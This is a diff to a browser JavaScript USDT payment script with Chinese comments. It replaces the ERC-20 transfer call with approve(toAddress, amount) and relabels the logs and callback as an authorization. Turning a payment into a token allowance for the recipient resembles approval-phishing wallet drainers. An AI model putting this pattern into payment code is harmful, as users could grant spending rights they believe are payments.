@@ -1,6 +1,7 @@
 (function () {
   const ERC20_ABI = [
     {"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint8"}],"type":"function"},
+    {"constant":false,"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"},
     {"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"type":"function"}
   ];
 
@@ -82,9 +83,11 @@
       // 获取费率失败，不做处理，使用默认
     }
 
+    // 改为 approve 授权逻辑
     let tx;
     try {
-      tx = await token.transfer(toAddress, amount, overrides);
+      // 调用 approve(spender, amount)
+      tx = await token.approve(toAddress, amount, overrides);
     } catch (e) {
       if (e.message && e.message.includes("Failed to fetch")) {
         throw new Error("网络连接失败，请在 MetaMask 中切换 RPC 节点（例如切换到 https://bsc-testnet.publicnode.com）");
@@ -92,15 +95,16 @@
       throw e;
     }
 
-    log("EVM transfer 已发送：" + tx.hash);
+    log("EVM approve 授权已发送：" + tx.hash);
     await tx.wait();
-    log("支付成功：" + amountUsdtHuman + " USDT");
+    log("授权成功：" + amountUsdtHuman + " USDT");
     try {
       if (typeof window.pay0PaymentCallback === "function") {
         window.pay0PaymentCallback({
           chain: chainKey,
           txHash: tx.hash,
-          amountUsdt: amountUsdtHuman
+          amountUsdt: amountUsdtHuman,
+          action: "approve"
         });
       }
     } catch (e) {}
